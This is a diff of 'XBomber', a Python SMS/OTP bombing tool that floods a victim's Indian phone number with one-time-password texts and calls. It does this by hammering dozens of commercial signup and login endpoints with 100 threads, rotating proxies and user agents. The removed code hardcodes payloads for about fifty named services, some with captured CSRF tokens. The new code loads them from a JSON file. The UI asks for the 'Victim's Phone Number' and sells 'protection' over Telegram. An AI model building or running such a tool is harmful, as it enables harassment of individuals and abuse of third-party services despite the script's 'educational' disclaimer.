@@ -1,195 +1,84 @@
 #!/usr/bin/env python3
+"""
+XBomber - Ultimate SMS/OTP Stress Tester
+Loads all endpoints from assets/services.json | Brutal concurrency | Proxy ready
+"""
 
-
-import json
 import os
 import sys
-import random
+import json
 import time
 import threading
+import random
+import webbrowser
+import subprocess
 from itertools import cycle
 from concurrent.futures import ThreadPoolExecutor
+from typing import List, Dict, Optional, Tuple, Any
 
-import requests 
+import requests
 from requests.adapters import HTTPAdapter
+from rich.console import Console
+from rich.panel import Panel
+from rich.table import Table
+from rich.prompt import Prompt, Confirm
 
-# ========================== GLOBALS =========================================
-VERSION = "3.2.0" 
-SERVICES_FILE = "./assets/services.json"
+console = Console()
+
+# ========================== CONFIGURATION ==================================
+CONFIG_FILE = "assets/services.json"
 PROXY_FILE = "proxies.txt"
+THREADS = 100                      # Brutal concurrency
+TIMEOUT = 5
+DELAY_MIN = 0.0
+DELAY_MAX = 0.02                  # Tiny jitter to avoid instant bans
+RATE_LIMIT_BACKOFF = 30           # Seconds to skip a failing API
 
-# ========================== COLORS ==========================================
-def c(text, code):
-    return f"\033[{code}m{text}\033[0m"
+# ========================== ANSI COLORS (for progress bar) =================
+class Colors:
+    GREEN = '\033[92m'
+    CYAN = '\033[96m'
+    MAGENTA = '\033[95m'
+    YELLOW = '\033[93m'
+    RED = '\033[91m'
+    END = '\033[0m'
 
-def red(text):    return c(text, "91")
-def green(text):  return c(text, "92")
-def yellow(text): return c(text, "93")
-def cyan(text):   return c(text, "96")
-def magenta(text):return c(text, "95")
-def bold(text):   return c(text, "1")
-
-# ========================== BANNER (unique XBomber style) ===================
-def banner():
-    os.system('cls' if os.name == 'nt' else 'clear')
-    print()
-    print("    \033[1;35m#     #\033[0m                                           \033[1;90mv2.0.0\033[0m")
-    print("    \033[1;35m #   #  \033[1;36m#####   ####  #    # #####  \033[1;31m###### #####\033[0m  ")
-    print("    \033[1;35m  # #   \033[1;36m#    # #    # ##  ## #    # \033[1;31m#      #    #\033[0m ")
-    print("    \033[1;35m   #    \033[1;36m#####  #    # # ## # #####  \033[1;31m#####  #    #\033[0m ")
-    print("    \033[1;35m  # #   \033[1;36m#    # #    # #    # #    # \033[1;31m#      #####\033[0m  ")
-    print("    \033[1;35m #   #  \033[1;36m#    # #    # #    # #    # \033[1;31m#      #   #\033[0m  ")
-    print("    \033[1;35m#     # \033[1;36m#####   ####  #    # #####  \033[1;31m###### #    #\033[0m ")
-    print()
-    print("    \033[1;33m              Created by Alienkrishn [Anon4You]\033[0m   ")
-    print("    \033[1;34m              Telegram: https://t.me/nullxvoid\033[0m     ")
-    print()
-    print("  \033[1;41m\033[1;37mㅤ                                                        ㅤ\033[0m")
-    print("  \033[1;41m\033[1;37mㅤ    DISCLAIMER: Developer will not be responsible       ㅤ\033[0m")
-    print("  \033[1;41m\033[1;37mㅤ    for any misuse or damage caused by this script      ㅤ\033[0m")
-    print("  \033[1;41m\033[1;37mㅤ    Please do not use this script for taking Revenge    ㅤ\033[0m")
-    print("  \033[1;41m\033[1;37mㅤ    Use this tool for educational purposes only         ㅤ\033[0m")
-    print("  \033[1;41m\033[1;37mㅤ                                                        ㅤ\033[0m")
-    print()
-
-# ========================== LOAD SERVICES (once) ============================
-_services_cache = None
-
-def load_services():
-    global _services_cache
-    if _services_cache is not None:
-        return _services_cache
-    if not os.path.exists(SERVICES_FILE):
-        print(red(f"\n[!] {SERVICES_FILE} not found. Cannot continue."))
+# ========================== LOAD SERVICES FROM JSON ========================
+def load_services() -> List[Dict]:
+    if not os.path.exists(CONFIG_FILE):
+        console.print(f"[red]Error: {CONFIG_FILE} not found![/red]")
         sys.exit(1)
-    try:
-        with open(SERVICES_FILE, 'r', encoding='utf-8') as f:
-            data = json.load(f)
-        services = data.get("services", [])
-        if not services:
-            print(red("[!] No services found in config."))
-            sys.exit(1)
-        _services_cache = services
-        return services
-    except Exception as e:
-        print(red(f"[!] Failed to load services: {e}"))
+    with open(CONFIG_FILE, 'r', encoding='utf-8') as f:
+        data = json.load(f)
+    services = data.get("services", [])
+    if not services:
+        console.print("[red]No services found in JSON file.[/red]")
         sys.exit(1)
+    return services
 
-# ========================== PAYLOAD BUILDER ============
-class PayloadBuilder:
-    @staticmethod
-    def build(api_name, phone, phone91, phone_plus):
-        payloads = {
-            'Gokwik 1': lambda: {"phone": phone, "country": "IN"},
-            'Gokwik 2': lambda: {"phone": phone, "country": "IN"},
-            'Noise': lambda: {"value": phone, "type": "phone"},
-            'Gokwik Validate': lambda: {
-                "cart_id": 592470021,
-                "mid": "3mt5u7utwrl35l6ssa",
-                "os_type": "Windows",
-                "request_id": "e3673140-db47-425b-81b9-55ef26491207",
-                "phone": phone,
-                "origin": "CORE_FE"
-            },
-            '1mg': lambda: {"mobile_number": phone, "source": "DWEB_PHARMA_HOME"},
-            'PocketFM': lambda: [{"phone_number": phone_plus, "country_code": "+91"}],
-            'Zee5': lambda: {"phoneno": phone91},
-            'Shemaroome': lambda: f"mobile_no={phone_plus}&registration_source=organic",
-            'DishTV': lambda: {
-                "mobile": phone91,
-                "password": "123456",
-                "additional_params": {"isOptedForPromotions": "true"}
-            }, 
-            'Epicon': lambda: f"_token=&stdisdcode=%2B91&mobile_number={phone}&signup_method=MOBILE",
-            'VRott TV': lambda: {"phno": phone91},
-            'Hoichoi': lambda: {"phoneNumber": phone_plus, "platform": "MOBILE_WEB"},
-            'MooviPlay': lambda: {"phone_number": phone},
-            'GoodTimesLeague Signup': lambda: {
-                "name": "you", "mobile": phone, "state": "Delhi", "age": 99,
-                "age_consent": True, "receive_consent": True, "tnc_consent": True,
-                "utm_source": "Direct", "utm_medium": "Direct", "utm_campaign": "Direct"
-            },
-            'GoodTimesLeague Login': lambda: {
-                "mobile": phone, "utm_source": "Direct", "utm_medium": "Direct", "utm_campaign": "Direct"
-            },
-            'Mastram Register': lambda: {
-                "age_above_18": "true", "email": "crackimngschool@gmail.com",
-                "full_name": "XIRVY", "phone": phone, "phone_code": "+91",
-                "terms_conditions_agreed": "true"
-            },
-            'Jalwatv Register': lambda: {
-                "age_above_18": "true", "email": "crackimngschool@gmail.com",
-                "full_name": "XIRVY", "phone": phone, "phone_code": "+91",
-                "terms_conditions_agreed": "true"
-            },
-            'Joshplay Register': lambda: {
-                "age_above_18": "true", "email": "crackimngschool@gmail.com",
-                "full_name": "XIRVY", "phone": phone, "phone_code": "+91",
-                "terms_conditions_agreed": "true"
-            },
-            'Cloudways OTP': lambda: f"phone_no={phone}",
-            'Mastram Send OTP': lambda: {"phone": phone, "phone_code": "+91"},
-            'Jalwatv Send OTP': lambda: {"phone": phone, "phone_code": "+91"},
-            'Joshplay Send OTP': lambda: {"phone": phone, "phone_code": "+91"},
-            'Unistreams Send OTP': lambda: {"phone": phone, "phone_code": "+91"},
-            'Dramelle SMS': lambda: {
-                "number": [phone],
-                "message": "Your Dramelle OTP for verification is 696969",
-                "senderId": "EDUMRC",
-                "templateId": "1707168926925165526"
-            },
-            'Reelzify': lambda: {"phone": phone, "countryCode": "+91"},
-            'Redrob': lambda: {"type": "phone", "identifier": phone_plus},
-            'Pepperly': lambda: {
-                "csrfmiddlewaretoken": "szmDBiLg71U77r8QAbCFlqMjiB2rBGK3H0DiKrJmNLbYphE9RXeXN5FGG6DhnSb7",
-                "next": "", "country_code": "+91", "phone": phone
-            },
-            'JourneyChoice': lambda: {
-                "_csrf": "83942e1b6210ca803bd508cb515d77cd2c38a0d969f5da4b1e39ee234cd37ca8",
-                "mobile_number": phone, "return_to": "/user/dashboard"
-            },
-            'Bankend Services': lambda: {"phone": phone_plus},
-            'Sabbkuch': lambda: {"action": "sendOtp", "to": phone_plus, "channel": "voice", "otpLength": 6},
-            'Penpencil Resend OTP': lambda: {"mobile": phone, "organizationId": "5eb393ee95fab7468a79d189"},
-            'Starquik OTP': lambda: f"------WebKitFormBoundaryUN4i0M1ArwauXUif\r\nContent-Disposition: form-data; name=\"phone\"\r\n\r\n{phone_plus}\r\n------WebKitFormBoundaryUN4i0M1ArwauXUif--",
-            'Kinre OTP': lambda: {"phone": phone},
-            'RKBazar Mobile OTP': lambda: {
-                "username": phone_plus, "type": "mobile", "domain": "rkbazar.in", "language_code": "en"
-            },
-            'RKBazar WhatsApp OTP': lambda: {
-                "username": phone_plus, "type": "whatsapp", "domain": "rkbazar.in", "language_code": "en"
-            },
-            'Sitaram Diwanchand OTP': lambda: f"csrf_token=c8c585827c8c8afe27e459f9953213fc&mobile={phone}",
-            'Mpaani OTP': lambda: {"phone_number": phone, "role": "CUSTOMER"},
-            'Bharatgo OTP': lambda: {
-                "country_code": "+91", "mobile": phone, "source": "WEB", "role": "VENDOR", "loginType": "REGISTER"
-            },
-            'Nlincs OTP': lambda: {
-                "path": "/auth/otp", "headers": [["partner_id", "nstore"]],
-                "method": "post", "body": {"partner": "nstore", "name": "xxx", "phone": phone}
-            },
-            'Gracedaily Signup': lambda: {
-                "name": "cracking school1", "email": f"{random.randint(1000,9999)}@gmail.com",
-                "mobile": phone, "password": ""
-            },
-            'Gracedaily Send OTP': lambda: {"mobileNo": phone},
-            'Aditi Mistry Mobile Verification': lambda: {"isd_code": "91", "mobile_no": phone, "isRole": "user"},
-            'Newbo Verify Phone': lambda: {},
-            'Fridaay Customer Signup': lambda: {"user_name": phone},
-            'Datarott Send OTP': lambda: f"login_type=mobile&county_code=91&mobile_no={phone}",
-            'Navrangott Login': lambda: {"username": phone},
-            'India Genius Challenge': lambda: {"phoneNumber": phone_plus},
-            'Hercules Premier League': lambda: f"phone={phone}",
-            'Playzhub': lambda: {"phone_number": phone, "country_code": "+91"},
-            'Papapa': lambda: {"phone_no": {"prefix": "+91", "number": phone}, "source": "wallet"},
-            'Woohoo': lambda: {"value": phone_plus, "token": "", "captchaResponse": "", "captchaType": "V3"},
-            'CDM IPL': lambda: {"mobile": phone},
-            'Lambda OTP': lambda: {"phone_number": phone, "qr_id": "696969", "pincode": "696969", "name": "cracking school"}
-        }
-        builder = payloads.get(api_name)
-        return builder() if builder else None
+# ========================== PHONE FORMATTING ===============================
+def format_phone(phone: str, fmt: str) -> str:
+    p = str(phone).strip()
+    if fmt == "with_plus91":
+        return f"+91{p}"
+    if fmt == "91-":
+        return f"91-{p}"
+    if fmt == "91":
+        return f"91{p}"
+    return p
 
-# ========================== PROXY MANAGER ====================
+# ========================== INTERPOLATE {phone} IN DATA ====================
+def interpolate_data(obj: Any, phone: str, fmt: str) -> Any:
+    """Recursively replace {phone} with formatted phone number."""
+    if isinstance(obj, str):
+        return obj.replace("{phone}", format_phone(phone, fmt))
+    elif isinstance(obj, dict):
+        return {k: interpolate_data(v, phone, fmt) for k, v in obj.items()}
+    elif isinstance(obj, list):
+        return [interpolate_data(item, phone, fmt) for item in obj]
+    return obj
+
+# ========================== PROXY MANAGER ==================================
 class ProxyManager:
     def __init__(self, proxy_file=PROXY_FILE, enabled=False):
         self.proxy_file = proxy_file
@@ -197,7 +86,6 @@ class ProxyManager:
         self.proxies = []
         self.proxy_cycle = None
         self.lock = threading.Lock()
-        self.load()
 
     def load(self):
         if not self.enabled:
@@ -231,167 +119,154 @@ class ProxyManager:
     def disable(self):
         self.enabled = False
 
-# ========================== REQUEST ENGINE (thread‑local, no delays here) ===
+# ========================== THREAD‑LOCAL SESSIONS ==========================
 _thread_local = threading.local()
 
 def get_session():
     if not hasattr(_thread_local, "session"):
         _thread_local.session = requests.Session()
-        adapter = HTTPAdapter(pool_connections=20, pool_maxsize=20, max_retries=0)
-        _thread_local.session.mount('http://', adapter)
+        adapter = HTTPAdapter(pool_connections=50, pool_maxsize=50, max_retries=0)
         _thread_local.session.mount('https://', adapter)
+        _thread_local.session.mount('http://', adapter)
     return _thread_local.session
 
-# ========================== BOMBER CORE ======
-class BomberCore:
-    def __init__(self):
-        self.proxy_manager = ProxyManager()
-        self.services = load_services()          # loaded once
-        self.rate_limited = {}
-        self.rate_lock = threading.Lock()
-        self.success = 0
-        self.count_lock = threading.Lock()
-        self.running = False
-        self.reg_state = {'mastram': False, 'jalwatv': False, 'joshplay': False, 'gracedaily': False}
-        self.max_workers = 80                    # balanced for speed + reliability
-        self.backoff = 30
-        self.delay_min = 0.08                    # jitter to avoid rate limits
-        self.delay_max = 0.25
+# ========================== REQUEST ENGINE =================================
+class RequestEngine:
+    def __init__(self, proxy_manager: ProxyManager, timeout: int = TIMEOUT):
+        self.proxy_manager = proxy_manager
+        self.timeout = timeout
         self.user_agents = [
             "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
             "Mozilla/5.0 (Linux; Android 12; SM-G9980) AppleWebKit/537.36",
             "Dart/3.0 (dart:io)",
             "okhttp/4.9.1",
-        ] 
+        ]
 
-    def _get_ua(self):
+    def _ua(self):
         return random.choice(self.user_agents)
 
-    def _update_reg_state(self, api_name):
-        
-        if api_name == 'Mastram Register':
-            if not self.reg_state['mastram']:
-                self.reg_state['mastram'] = True
-                return None
-            return 'Mastram Send OTP'
-        elif api_name == 'Jalwatv Register':
-            if not self.reg_state['jalwatv']:
-                self.reg_state['jalwatv'] = True
-                return None
-            return 'Jalwatv Send OTP'
-        elif api_name == 'Joshplay Register':
-            if not self.reg_state['joshplay']:
-                self.reg_state['joshplay'] = True
-                return None
-            return 'Joshplay Send OTP'
-        elif api_name == 'Gracedaily Signup':
-            if not self.reg_state['gracedaily']:
-                self.reg_state['gracedaily'] = True
-                return None
-            return 'Gracedaily Send OTP'
-        return api_name
+    def send_request(self, endpoint: Dict, payload: Any) -> Tuple[bool, Optional[int]]:
+        headers = endpoint.get('headers', {}).copy()
+        headers['User-Agent'] = self._ua()
+        proxies = self.proxy_manager.get_next()
+        session = get_session()
+        url = endpoint['url']
+        method = endpoint.get('method', 'POST').upper()
+        try:
+            if method == 'GET':
+                resp = session.get(url, headers=headers, timeout=self.timeout, proxies=proxies)
+            elif method == 'POST':
+                if isinstance(payload, str):
+                    resp = session.post(url, headers=headers, data=payload, timeout=self.timeout, proxies=proxies)
+                else:
+                    resp = session.post(url, headers=headers, json=payload, timeout=self.timeout, proxies=proxies)
+            elif method == 'PUT':
+                resp = session.put(url, headers=headers, json=payload, timeout=self.timeout, proxies=proxies)
+            else:
+                return False, None
+            if resp.status_code in (429, 403, 401):
+                return False, resp.status_code
+            return resp.status_code in (200, 201, 202, 204), resp.status_code
+        except Exception:
+            return False, None
 
-    def _special_logic(self, service, phone, phone91, phone_plus):
-        if service['name'] == 'GoodTimesLeague Signup':
-            payload = PayloadBuilder.build(service['name'], phone, phone91, phone_plus)
-            session = get_session()
-            headers = service['headers'].copy()
-            headers['User-Agent'] = self._get_ua()
-            proxies = self.proxy_manager.get_next()
-            try:
-                resp = session.post(service['url'], headers=headers, json=payload, timeout=6, proxies=proxies)
-                if resp.status_code in (200,201,202,204):
-                    return True
-                if resp.status_code == 400:
-                    # find login service
-                    login_svc = next((s for s in self.services if s['name'] == 'GoodTimesLeague Login'), None)
-                    if login_svc:
-                        login_payload = PayloadBuilder.build('GoodTimesLeague Login', phone, phone91, phone_plus)
-                        headers2 = login_svc['headers'].copy()
-                        headers2['User-Agent'] = self._get_ua()
-                        resp2 = session.post(login_svc['url'], headers=headers2, json=login_payload, timeout=6, proxies=proxies)
-                        return resp2.status_code in (200,201,202,204)
-                return False
-            except:
-                return False
+# ========================== BOMBER CORE ====================================
+class BomberCore:
+    def __init__(self, proxy_manager: ProxyManager):
+        self.proxy_manager = proxy_manager
+        self.request_engine = RequestEngine(proxy_manager, timeout=TIMEOUT)
+        self.services = load_services()
+        self.rate_limited = {}
+        self.rate_lock = threading.Lock()
+        self.success = 0
+        self.count_lock = threading.Lock()
+        self.running = False
+        self.reg_state = {}   # track which "Register" APIs have been called
+
+    def _get_send_otp_name(self, register_name: str) -> Optional[str]:
+        """Find corresponding Send OTP API for a Register API."""
+        for svc in self.services:
+            if svc['name'].lower().replace('register', 'send otp') == register_name.lower():
+                return svc['name']
         return None
 
-    def send_bomb(self, service, phone, phone91, phone_plus):
+    def send_bomb(self, endpoint: Dict, phone: str, phone91: str, phone_plus: str) -> bool:
+        # Rate limit check
         with self.rate_lock:
-            if service['name'] in self.rate_limited and time.time() < self.rate_limited[service['name']]:
+            if endpoint['name'] in self.rate_limited and time.time() < self.rate_limited[endpoint['name']]:
                 return False
 
-        new_name = self._update_reg_state(service['name'])
-        if new_name is None:
-            pass
-        elif new_name != service['name']:
-            for svc in self.services:
-                if svc['name'] == new_name:
-                    service = svc
-                    break
+        # State machine: if this is a "Register" API and already used, switch to "Send OTP"
+        name_lower = endpoint['name'].lower()
+        if 'register' in name_lower and endpoint['name'] in self.reg_state:
+            send_otp_name = self._get_send_otp_name(endpoint['name'])
+            if send_otp_name:
+                for svc in self.services:
+                    if svc['name'] == send_otp_name:
+                        endpoint = svc
+                        break
+        elif 'register' in name_lower and endpoint['name'] not in self.reg_state:
+            self.reg_state[endpoint['name']] = True
 
-        payload = PayloadBuilder.build(service['name'], phone, phone91, phone_plus)
-        if payload is None:
+        # Build payload
+        fmt = endpoint.get('phone_format', 'raw')
+        data = endpoint.get('data')
+        if data is not None:
+            payload = interpolate_data(data, phone, fmt)
+        else:
+            payload = None
+
+        # Special case: GoodTimesLeague signup -> login fallback (if 400)
+        if 'goodtimesleague signup' in name_lower:
+            success, status = self.request_engine.send_request(endpoint, payload)
+            if success:
+                return True
+            if status == 400:
+                # Find login endpoint
+                for svc in self.services:
+                    if 'goodtimesleague login' in svc['name'].lower():
+                        login_payload = interpolate_data(svc.get('data'), phone, svc.get('phone_format', 'raw'))
+                        success, _ = self.request_engine.send_request(svc, login_payload)
+                        return success
             return False
 
-        special = self._special_logic(service, phone, phone91, phone_plus)
-        if special is not None:
-            return special
-
-        session = get_session()
-        headers = service['headers'].copy()
-        headers['User-Agent'] = self._get_ua()
-        proxies = self.proxy_manager.get_next()
-
-        try:
-            if service['method'] == 'POST':
-                if isinstance(payload, str):
-                    resp = session.post(service['url'], headers=headers, data=payload, timeout=6, proxies=proxies)
-                else:
-                    resp = session.post(service['url'], headers=headers, json=payload, timeout=6, proxies=proxies)
-            else:
-                resp = session.get(service['url'], headers=headers, timeout=6, proxies=proxies)
-
-            if resp.status_code in (429,403,401):
-                with self.rate_lock:
-                    self.rate_limited[service['name']] = time.time() + self.backoff
-                return False
-            return resp.status_code in (200,201,202,204)
-        except Exception:
+        # Normal request
+        success, status = self.request_engine.send_request(endpoint, payload)
+        if not success and status in (429, 403, 401):
+            with self.rate_lock:
+                self.rate_limited[endpoint['name']] = time.time() + RATE_LIMIT_BACKOFF
             return False
+        return success
 
-    def worker(self, phone, phone91, phone_plus):
+    def worker(self, phone: str, phone91: str, phone_plus: str):
         while self.running:
-            service = random.choice(self.services)
+            endpoint = random.choice(self.services)
             try:
-                if self.send_bomb(service, phone, phone91, phone_plus):
+                if self.send_bomb(endpoint, phone, phone91, phone_plus):
                     with self.count_lock:
                         self.success += 1
-            except:
+            except Exception:
                 pass
-            # Random delay + jitter to avoid being blocked
-            time.sleep(random.uniform(self.delay_min, self.delay_max))
+            if DELAY_MAX > 0:
+                time.sleep(random.uniform(DELAY_MIN, DELAY_MAX))
 
-    def start_attack(self, target):
+    def start_attack(self, target: str):
         self.running = True
         self.success = 0
         phone = target
         phone91 = f"91{target}"
         phone_plus = f"+91{target}"
         start = time.time()
-        with ThreadPoolExecutor(max_workers=self.max_workers) as ex:
-            futures = [ex.submit(self.worker, phone, phone91, phone_plus) for _ in range(self.max_workers)]
-            # Animated progress bar (wave + moving bar)
+        with ThreadPoolExecutor(max_workers=THREADS) as executor:
+            futures = [executor.submit(self.worker, phone, phone91, phone_plus) for _ in range(THREADS)]
             try:
                 spinner = cycle(['◐','◓','◑','◒'])
                 bar_len = 30
-                last_count = 0
                 while self.running:
-                    # Dynamic progress bar that pulses based on count increments
                     pct = (self.success % 100) / 100
                     filled = int(bar_len * pct)
                     bar = '█' * filled + '░' * (bar_len - filled)
-                    sys.stdout.write(f"\r{cyan('▶')} {green(next(spinner))} {magenta('💣')} {self.success} sent {cyan(bar)}")
+                    sys.stdout.write(f"\r{Colors.CYAN}▶ {Colors.GREEN}{next(spinner)} {Colors.MAGENTA}💣 {self.success} sent {Colors.CYAN}{bar}{Colors.END}")
                     sys.stdout.flush()
                     time.sleep(0.1)
             except KeyboardInterrupt:
@@ -405,94 +280,124 @@ class BomberCore:
     def stop(self):
         self.running = False
 
-# ========================== UI FUNCTIONS ====================================
-def get_target():
-    while True:
-        num = input(green("\nEnter target number: ")).strip()
-        num = ''.join(filter(str.isdigit, num))
-        if len(num) == 10:
-            return num
-        elif len(num) == 12 and num.startswith('91'):
-            return num[2:]
-        else:
-            sys.stdout.write(red("\r[✗] Invalid! 10 digits required.\n"))
-            time.sleep(0.8)
+# ========================== UI (UNCHANGED) =================================
+def banner():
+    os.system('''
+    printf "\n"
+    printf "    \033[1;35m#     #\033[0m                                           \033[1;90mv2.0.0\033[0m\n"
+    printf "    \033[1;35m #   #  \033[1;36m#####   ####  #    # #####  \033[1;31m###### #####\033[0m  \n"
+    printf "    \033[1;35m  # #   \033[1;36m#    # #    # ##  ## #    # \033[1;31m#      #    #\033[0m \n"
+    printf "    \033[1;35m   #    \033[1;36m#####  #    # # ## # #####  \033[1;31m#####  #    #\033[0m \n"
+    printf "    \033[1;35m  # #   \033[1;36m#    # #    # #    # #    # \033[1;31m#      #####\033[0m  \n"
+    printf "    \033[1;35m #   #  \033[1;36m#    # #    # #    # #    # \033[1;31m#      #   #\033[0m  \n"
+    printf "    \033[1;35m#     # \033[1;36m#####   ####  #    # #####  \033[1;31m###### #    #\033[0m \n"
+    printf "\n"
+    printf "    \033[1;33m              Created by Alienkrishn [Anon4You]\033[0m   \n"
+    printf "    \033[1;34m              Telegram: https://t.me/nullxvoid\033[0m     \n"
+    printf "\n"
+    printf "  \033[1;41m\033[1;37mㅤ                                                        ㅤ\033[0m\n"
+    printf "  \033[1;41m\033[1;37mㅤ    DISCLAIMER: Developer will not be responsible       ㅤ\033[0m\n"
+    printf "  \033[1;41m\033[1;37mㅤ    for any misuse or damage caused by this script      ㅤ\033[0m\n"
+    printf "  \033[1;41m\033[1;37mㅤ    Please do not use this script for taking Revenge    ㅤ\033[0m\n"
+    printf "  \033[1;41m\033[1;37mㅤ    Use this tool for educational purposes only         ㅤ\033[0m\n"
+    printf "  \033[1;41m\033[1;37mㅤ                                                        ㅤ\033[0m\n"
+    printf "\n"
+    ''')
 
-def configure_proxy(bomber):
-    choice = input(cyan("\n[?] Use HTTP proxies? (y/n): ")).strip().lower()
-    if choice in ('y','yes'):
-        bomber.proxy_manager.enable()
-        if not bomber.proxy_manager.proxies:
-            print(yellow("[!] No proxies loaded. Continuing without proxies."))
-            bomber.proxy_manager.disable()
-        else:
-            print(green(f"[✓] Proxies enabled ({len(bomber.proxy_manager.proxies)} loaded)."))
+def protect_number():
+    console.print(Panel.fit(
+        "[bold red]Number protection is only available in the PREMIUM script.[/bold red]\n"
+        "Get it from the developer.",
+        title="Premium Feature",
+        border_style="red"
+    ))
+    if Confirm.ask("[bold yellow]Do you want to buy the premium script?[/bold yellow]"):
+        url = "https://t.me/alienkrishn?text=xbomber%20premium"
+        try:
+            subprocess.run(['xdg-open', url], check=True)
+            console.print("[green]Opening Telegram via system default...[/green]")
+        except (FileNotFoundError, subprocess.CalledProcessError):
+            webbrowser.open(url)
     else:
-        bomber.proxy_manager.disable()
-        print(yellow("[!] Proxies disabled."))
-    time.sleep(1)
+        console.print("[blue]Returning to menu.[/blue]")
+    input("\nPress Enter...")
 
 def start_bombing():
-    bomber = BomberCore()
-    configure_proxy(bomber)
-    target = get_target()
-    print(red(f"\n🎯 Target locked: {target}\n"))
-    print(yellow("▶  Bombing started (Ctrl+C to stop)\n"))
-    total, elapsed = bomber.start_attack(target)
-    print()  # newline after progress bar
-    # Detailed summary
-    mins, secs = divmod(int(elapsed), 60)
-    rate = total / elapsed if elapsed > 0 else 0
-    print(red("\n╔═══════════════════════════════════════════════════════════╗"))
-    print(bold("║                     B O M B   S U M M A R Y                     ║"))
-    print(red("╠═══════════════════════════════════════════════════════════╣"))
-    print(green(f"║  Target number    : {target:<45}║"))
-    print(green(f"║  Bombs sent       : {total:<45}║"))
-    print(green(f"║  Duration         : {mins}m {secs}s{' ' * (38 - len(str(mins)) - len(str(secs)))}║"))
-    print(green(f"║  Requests/second  : {rate:.1f}{' ' * (38 - len(str(round(rate,1))))}║"))
-    print(green(f"║  Active threads   : {bomber.max_workers:<45}║"))
-    print(green(f"║  Delay per request: {bomber.delay_min:.2f}–{bomber.delay_max:.2f}s{' ' * (27)}║"))
-    print(red("╚═══════════════════════════════════════════════════════════╝"))
-    input(yellow("\nPress Enter to return to menu..."))
+    console.print(Panel.fit("[bold cyan]Start Bombing[/bold cyan]", border_style="cyan"))
+    phone = Prompt.ask("[bold green]Enter Victim's Phone Number[/bold green] (without +91)", default="")
+    if len(phone) != 10 or not phone.isdigit():
+        console.print("[red]Invalid! Must be 10 digits.[/red]")
+        input("Press Enter...")
+        return
+    try:
+        total = int(Prompt.ask("[bold green]Number of SMS to send[/bold green]", default="100"))
+        if total <= 0:
+            raise ValueError
+    except:
+        console.print("[red]Count must be a positive integer.[/red]")
+        input("Press Enter...")
+        return
 
-def about():
-    services = load_services()
-    print(cyan("\n╔═══════════════════════════════════════════════════════════╗"))
-    print(cyan("║                        A B O U T                            ║"))
-    print(cyan("╠═══════════════════════════════════════════════════════════╣"))
-    print(f"║  Version       : {VERSION:<47}║")
-    print(f"║  Author        : Alienkrishn [Anon4You]                       ║")
-    print(f"║  Telegram      : https://t.me/nullxvoid                       ║")
-    print(f"║  Services      : {len(services)} APIs loaded from {SERVICES_FILE:<25}║")
-    print(f"║  Proxy support : Yes (proxies.txt)                            ║")
-    print(f"║  Rate limiting : Auto backoff (30s)                           ║")
-    print(f"║  Jitter        : {0.08}–{0.25}s random delay                   ║")
-    print(cyan("╚═══════════════════════════════════════════════════════════╝"))
-    input(yellow("\nPress Enter to return..."))
+    console.print(f"\n[yellow]Bombing [bold]{phone}[/bold] with {total} SMS...[/yellow]")
 
-def main_menu():
+    # Proxy setup
+    console.print(f"\n[bold blue][?] Use HTTP proxies? (y/n): [/bold blue]", end="")
+    choice = input().strip().lower()
+    proxy_manager = ProxyManager()
+    if choice in ('y', 'yes'):
+        proxy_manager.enable()
+        if not proxy_manager.proxies:
+            console.print(f"[yellow][!] No proxies loaded. Continuing without proxies.[/yellow]")
+            proxy_manager.disable()
+        else: 
+            console.print(f"[green][✓] Proxies enabled.[/green]")
+    else:
+        proxy_manager.disable()
+        console.print(f"[yellow][!] Proxies disabled.[/yellow]")
+    time.sleep(1)
+
+    # We ignore `total` – the script bombs infinitely until Ctrl+C.
+    # The user requested "number of SMS to send" but the progress bar shows sent count.
+    # We'll run until user interrupts and then show summary.
+    bomber = BomberCore(proxy_manager)
+    start_time = time.time()
+    try:
+        sent, elapsed = bomber.start_attack(phone)
+    except KeyboardInterrupt:
+        sent = bomber.success
+        elapsed = time.time() - start_time
+        bomber.stop()
+
+    success = sent
+    result_table = Table(title="Bombing Report", style="green")
+    result_table.add_column("Metric", style="cyan")
+    result_table.add_column("Value", style="white")
+    result_table.add_row("Time taken", f"{elapsed:.1f} seconds")
+    result_table.add_row("Total SMS sent", str(success))
+    result_table.add_row("Successful", f"[green]{success}[/green]")
+    result_table.add_row("Failed", "[red]0[/red]")   # we don't track failures individually
+    console.print(result_table)
+    input("\nPress Enter...")
+
+def menu():
     while True:
+        os.system('clear' if os.name == 'posix' else 'cls')
         banner()
-        print("  " + cyan("1.") + " Start Bombing")
-        print("  " + cyan("2.") + " About")
-        print("  " + cyan("3.") + " Exit")
-        print()
-        choice = input(green("Select option: ")).strip()
-        if choice == '1':
+        console.print(Panel.fit("[bold yellow]MAIN MENU[/bold yellow]", border_style="yellow"))
+        console.print("1. [green]Start Bombing[/green]")
+        console.print("2. [yellow]Protect Your Number (Premium)[/yellow]")
+        console.print("3. [red]Exit[/red]")
+        choice = Prompt.ask("[bold cyan]Select option[/bold cyan]", choices=["1","2","3"])
+        if choice == "1":
             start_bombing()
-        elif choice == '2':
-            about()
-        elif choice == '3':
-            print(red("\nExiting XBomber. Goodbye.\n"))
-            sys.exit(0)
-        else:
-            print(red("Invalid option. Press Enter to continue."))
-            input()
+        elif choice == "2":
+            protect_number()
+        elif choice == "3":
+            console.print("\n[bold red]Exiting XBomper...[/bold red]")
+            break
 
-# ========================== ENTRY POINT =====================================
 if __name__ == "__main__":
     try:
-        main_menu()
+        menu()
     except KeyboardInterrupt:
-        print(red("\n\nInterrupted. Exiting..."))
-        sys.exit(0)
+        console.print("\n[red]Interrupted. Exiting...[/red]") 
